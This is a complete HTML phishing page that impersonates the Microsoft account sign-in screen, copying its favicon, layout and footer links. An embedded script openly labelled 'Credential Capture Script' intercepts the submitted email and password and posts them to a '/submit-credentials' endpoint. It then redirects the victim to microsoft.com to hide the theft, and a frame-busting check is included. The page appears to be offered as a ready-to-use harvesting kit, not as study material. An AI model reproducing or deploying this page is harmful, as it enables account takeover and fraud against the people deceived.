<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="style.css" />
  <title>Sign in to your Microsoft account</title>
  <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico" />
</head>
<body>
  <div class="container">
    <form onsubmit="handleSubmit(event)" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
      <img
            class="logo"
            src="images/nicro_logo.png"
            alt="Microsoft logo"
         />

      <div class="forms-container">
        <div class="forms">
          <div class="first">
            <h2>Sign in</h2>
            <div class="form-group">
              <input
                type="email"
                name="UsernameForm"
                placeholder="Email, Phone, or Skype"
                required
              />
            </div>
            <p>No account? <a href="#">Create One!</a></p>
            <a href="#">Sign in with a security key <span>?</span></a>
            <button type="button" class="next-btn">Next</button>
          </div>
          <div class="second">
            <p>
              <span class="arrow-btn">&#8592;</span>
              <span class="email">helloworld@hotmail.com</span>
            </p>
            <h2>Enter password</h2>
            <div class="form-group">
              <input
                type="password"
                name="password"
                placeholder="Password"
                required
              />
            </div>
            <a href="#">Forgot password?</a>
            <button type="submit">Sign in</button>
          </div>
        </div>
      </div>
    </form>
    <div class="bottom">
      <img
        class="key"
        src="images/key-removebg-preview.png"
      />
      <span>Sign-in options</span>
    </div>
  </div>

  <div
    id="footer"
    role="contentinfo"
    class="footer ext-footer"
  >
    <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
      <a
        id="ftrTerms"
        href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US"
        class="footer-content ext-footer-content footer-item ext-footer-item"
      >
        Terms of use
      </a>
      <a
        id="ftrPrivacy"
        href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US"
        class="footer-content ext-footer-content footer-item ext-footer-item"
      >
        Privacy &amp; cookies
      </a>
      <a
        id="moreOptions"
        href="#"
        role="button"
        aria-label="Click here for troubleshooting information"
        aria-expanded="false"
        class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"
      >
        ...
      </a>
    </div>
  </div>

  <!-- UI Scripts -->
  <script>
    const forms = document.querySelector(".forms");
    const nextButton = document.querySelector(".next-btn");
    const arrowButton = document.querySelector(".arrow-btn");

    const emailInput = document.querySelector('.first input[name="UsernameForm"]');
    const emailDisplay = document.querySelector(".email");
    const passwordInput = document.querySelector('.second input[name="password"]');

    nextButton.addEventListener("click", () => {
      forms.classList.add("next-form");
      emailDisplay.innerText = emailInput.value;
      passwordInput.setAttribute("placeholder", "Password for " + emailInput.value);
      document.querySelector(".bottom").style.display = "none";
    });

    arrowButton.addEventListener("click", () => {
      forms.classList.remove("next-form");
      document.querySelector(".bottom").style.display = "flex";
    });
  </script>

  <!-- Credential Capture Script -->
  <script>
  // Anti-frame protection (without breaking layout)
  if (self !== top) {
    top.location = self.location;
  }

  function handleSubmit(event) {
    event.preventDefault();

    const email = document.querySelector('input[name="UsernameForm"]').value;
    const password = document.querySelector('input[name="password"]').value;

    fetch("/submit-credentials", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email, password })
    }).finally(() => {
      window.location.href = "https://www.microsoft.com";
    });
  }
</script>

</body>
</html>
